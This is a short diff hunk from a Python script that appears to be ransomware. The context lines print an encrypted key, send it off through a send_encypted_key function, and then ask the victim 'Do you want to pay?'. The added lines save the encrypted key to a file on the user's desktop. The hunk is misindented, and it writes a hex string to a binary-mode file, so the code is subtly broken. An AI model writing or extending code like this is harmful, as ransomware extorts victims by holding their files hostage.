@@ -131,6 +131,10 @@ if __name__ == "__main__":
     print("Encrypted key:", key_encrypted)
     key_encrypted = key_encrypted.hex()
     print("Encrypted key:", key_encrypted)
+     file_path1 = os.path.join(desktop_path, 'key_encrypted.key')
+    with open(file_path1, 'wb') as f:
+        f.write(key_encrypted)
+
     response = send_encypted_key(key_encrypted)
 
     check = input("Do you want to pay? (y/n)")
